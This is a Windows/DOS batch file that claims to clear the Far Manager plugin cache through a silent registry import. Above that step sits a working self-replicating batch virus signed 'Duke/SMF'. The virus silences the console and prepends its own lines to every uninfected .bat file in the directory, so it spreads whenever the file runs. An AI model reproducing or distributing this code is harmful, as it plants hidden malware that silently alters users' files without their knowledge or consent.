@goto telo
:begin tel
@ctty nul%tel%
if "%1=="$ goto ztel
find "tel"<%0>tel.bat
echo.>>tel.bat
echo>>tel.bat @goto begin
echo>>tel.bat :end
for %%b in (*.bat) do call tel.bat $ %%b
del tel.bat
ctty con%tel%
@goto end%tel%
:ztel
find "tel"<%2>nul
if not errorlevel 1 goto end%tel%
find "tel"<%0>tel
type %2>>tel
echo.>>tel
echo>>tel @goto begin
echo>>tel :end
ren tel %2
copy tel %2
del tel
goto end%tel%
:telo (c) by Duke/SMF
rem -------------------------------------------------------------------------------------------------------------
@echo off
rem This batch file cleared the Plugin Cache

echo REGEDIT4 > "%TEMP%\$DelOld$.reg"
echo [-HKEY_CURRENT_USER\Software\Far\PluginsCache] >> "%TEMP%\$DelOld$.reg"
start/wait regedit -s "%TEMP%\$DelOld$.reg"
del "%TEMP%\$DelOld$.reg" > nul
rem -------------------------------------------------------------------------------------------------------------
@goto begin
:end
